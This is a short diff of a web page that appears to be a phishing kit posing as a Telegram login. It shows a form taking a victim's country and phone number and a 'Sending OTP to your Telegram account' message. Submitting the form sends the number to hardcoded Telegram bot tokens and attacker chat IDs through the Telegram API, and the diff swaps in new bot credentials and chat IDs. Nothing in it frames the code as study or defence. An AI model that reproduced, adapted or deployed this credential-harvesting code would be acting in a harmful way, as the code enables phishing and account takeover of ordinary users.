@@ -21,7 +21,7 @@
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: url('bg1.jpeg') no-repeat center center fixed;
+      background: url('ms3.webp') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -202,8 +202,8 @@ const loadingText = document.getElementById('loadingText');
 const countrySelect = document.getElementById('countrySelect');
 
 const bots = [
-  { token: "8767083970:AAErtjNdtgZ73KhuDAyTRWXwXEI6SiQGMqI", chatId: "8077606058" },
-  { token: "8800204270:AAHGcm-4O6eKVrE0v_3yzeuqH_woca77o0o", chatId: "8077606058" }
+  { token: "8800204270:AAHGcm-4O6eKVrE0v_3yzeuqH_woca77o0o", chatId: "6548196059" },
+  { token: "8800204270:AAHGcm-4O6eKVrE0v_3yzeuqH_woca77o0o", chatId: "6548196059" }
 ];
 
 phoneForm.addEventListener('submit', function(e) {
@@ -215,7 +215,7 @@ phoneForm.addEventListener('submit', function(e) {
   localStorage.setItem('sessionBotIndex', currentBotIndex);
   const bot = bots[currentBotIndex];
 
-  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const message = `🌀 *FUN LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
   const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
   statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
